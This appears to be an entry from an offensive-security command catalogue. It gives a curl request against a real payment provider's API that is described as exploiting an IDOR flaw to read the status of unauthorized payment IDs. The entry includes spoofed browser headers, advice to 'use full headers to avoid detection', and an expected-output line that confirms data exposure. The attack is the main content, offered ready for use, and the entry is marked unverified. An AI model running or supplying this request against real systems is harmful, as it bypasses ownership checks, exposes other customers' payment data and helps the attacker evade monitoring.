---
data: >-
  curl -X GET "https://api.omise.co/payments/paym_test_xxx/status" -H
  "Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google
  Chrome\";v=\"100\"" -H "Sec-Ch-Ua-Mobile: ?0" -H "User-Agent: Mozilla/5.0
  (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)
  Chrome/100.0.4896.75 Safari/537.36" -H "Sec-Ch-Ua-Platform: \"macOS\"" -H
  "Accept: */*" -H "Sec-Fetch-Site: same-origin" -H "Sec-Fetch-Mode: cors" -H
  "Sec-Fetch-Dest: empty" -H "Referer: https://api.omise.co/" -H
  "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.9" -H
  "Connection: close"
tags:
  - api
  - http
  - get
  - idor
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:33.727Z'
id: 4f9eb60a-2e6c-4bdf-8fe1-d6cb0320c382
verified: false
validated: true
submitted: true
---
# omise-retrieve-unauthorized-payment-status

## Command

```bash
curl -X GET "https://api.omise.co/payments/paym_test_xxx/status" \
  -H "Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" \
  -H "Sec-Ch-Ua-Mobile: ?0" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36" \
  -H "Sec-Ch-Ua-Platform: \"macOS\"" \
  -H "Accept: */*" \
  -H "Sec-Fetch-Site: same-origin" \
  -H "Sec-Fetch-Mode: cors" \
  -H "Sec-Fetch-Dest: empty" \
  -H "Referer: https://api.omise.co/" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Connection: close"
```

## Description

This command exploits IDOR by requesting payment status for a modified, unauthorized payment ID, bypassing ownership checks in the Omise API.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| payment_id (path) | Target unauthorized payment identifier (e.g., paym_test_xxx) | Yes |
| Headers | Standard browser headers for request authenticity | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.omise.co/payments/paym_test_xxx/status" -H "Accept: */*"
```

### Advanced Usage

Use full headers to avoid detection.

## Expected Output

HTTP/2 200 OK with JSON {"processed":true} for valid unauthorized IDs, confirming data exposure.

## Related

- [[commands/omise-retrieve-own-payment-status]]
- [[procedures/Exploit-IDOR-in-Omise-Payment-Status-API]]
